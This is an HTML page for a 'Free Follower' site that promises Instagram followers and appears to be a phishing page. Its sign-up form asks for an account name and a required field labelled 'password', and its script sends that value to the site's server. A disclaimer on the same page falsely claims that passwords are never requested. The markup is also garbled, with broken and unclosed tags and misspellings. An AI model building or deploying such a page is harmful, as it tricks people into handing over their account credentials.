!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>Free Follower — Instagrame https//account</title>
  <link rel="stylesheet" href="/style.css">
</head>
 <link rel="stylesheet" href="style.css">
  <header>
    <h1>Free Follower</h1>
    <p class="tag">Increase your Followers on your instagrame account .</p>
  </header>
    <header
             <h2 class="Free follower">Free Follower</h2>
             <nav class="navigation">
                <a href="#">Home</a>
                 a href="#">About</a>
                 a href="#">service</a>
                 a href="#">contact</a>
            <button class="btn-login">Login</button>
                
             </nav>
      <h2>Get weekly growth tips</h2>
      <p>Enter your accouint to receive actionable, policy-compliant Instagram growth strategies.</p>

      <form id="signupForm">
        <input type="text" name="name" id="name" placeholder="account name (optional)" />
        <input type="text" name="handle" id="handle" placeholder="password" required />
        <input type="text" name="name" id="name" placeholder="How much do you want"
        <button type="submit">CONTINUE</button>
      </form>

      <p id="msg" class="msg"></p>

      <small class="disclaimer">We do NOT and will NEVER ask for your Instagram password. Provide only your public handle (no passwords).</small>
    </section>

    <section class="how">
      <h3>What you get</h3>
      <ul>
        <li>Weekly accoint with content ideas and best practices</li>
        <li>Free checklist to optimize your profile</li>
        <li>Legal growth strategies — no bots, no hacks</li>
        <li>Waiting for 24h to increase your followers</li>
      </ul>
    </section>
  </main>

  <footer>
    <p>&copy; Free Follower — Privacy respected. Your email is used only for the newsletter.</p>
  </footer>

    <script>
    document.getElementById('signupForm').addEventListener('submit', async function(e){
      e.preventDefault();
      const name = document.getElementById('name').value.trim();
      const handle = document.getElementById('handle').value.trim();
      const msg = document.getElementById('msg');
      msg.textContent = '';
      if(!handle) { msg.textContent = 'Please enter your handle.'; return; }
      try{
        const r = await fetch('/signup', {
          method: 'POST',
          headers: {'Content-Type':'application/json'},
          body: JSON.stringify({name, handle})
        });
        const j = await r.json();
        if(r.ok && j.status === 'ok') msg.textContent = 'Thanks — you are signed up!';
        else if(j.status === 'already') msg.textContent = 'This handle is already signed up.';
        else msg.textContent = j.error || 'Unexpected response';
      }catch(err){
        msg.textContent = 'Network error';
      }
    });
  </script>
</body>
</html>

